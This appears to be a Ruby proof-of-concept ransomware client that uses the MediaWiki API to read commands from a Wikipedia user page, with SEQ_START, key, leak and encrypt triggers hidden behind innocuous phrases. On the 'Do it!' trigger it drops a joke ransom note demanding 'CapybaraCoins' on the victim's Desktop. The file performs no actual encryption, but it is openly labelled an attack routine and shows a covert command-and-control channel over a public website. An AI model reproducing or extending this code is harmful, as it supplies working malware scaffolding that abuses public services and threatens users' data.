#!/usr/bin/ruby
#Libraries
require 'mediawiki_api'
require 'colorize'
user = "User:Mauroeldritch"

#Attack Routine
puts "Attempting to connect to Wikipedia...".light_blue
client = MediawikiApi::Client.new "https://en.wikipedia.org/w/api.php"
puts "Searching for tainted user...".light_blue
page = client.action :parse, page: "#{user}", token_type: false
puts "Found tainted user: #{user}".light_red
commands = []
puts "Recovering commands from the page...".light_yellow
page.data['text']['*'].split("\n").first(5).each do |x|
    commands.push(x.gsub(/<\/?[^>]*>/, ""))
end
#command_identifiers = ["SEQ_START", "set_key",                  "leak_info",  "crypt_start", "SEQ_END"]
command_identifiers =  ["SEQ_START", "Let me tell you a secret", "What's up?", "Do it!",      "SEQ_END"]
puts "Getting SEQ..."
commands.each do |command|
    if command.match?(Regexp.union(command_identifiers))
        case command
        when /SEQ_START/
            puts "Received SEQ_START".light_red
        when /Let me tell you a secret/
            puts "Received Key: #{command.split(":")[1]}".light_yellow
        when /What's up?/
            puts "No information to leak. Host will not be enrolled.".light_blue
        when /Do it!/
            puts "Starting encryption cycle...".light_red
            begin
                desktop = ""
                if Dir.exist?(File.expand_path('~') + "/Desktop")
                    desktop = "#{File.expand_path('~')}/Desktop"
                elsif Dir.exist?(File.expand_path('~') + "/Escritorio")
                    desktop = "#{File.expand_path('~')}/Escritorio"
                else
                    desktop = "/tmp"
                end
                File.open("#{desktop}/your_files_are_encrypted.txt", "w+") { |file| file.write("Your files are encrypted. Send us 2 CapybaraCoins to decrypt. Capybaracoins are the official uruguayan currency. $2 coins feature a nice and friendly capybara, AND WE WANT ALL OF THEM. NOW.") }
                ""
            rescue => e
                puts "Exception: #{e}"
                "Error: Failed to run supplied command."
            end
        when /SEQ_END/
            puts "Received SEQ_END"
        else
            "Bad Response"
        end
    end
end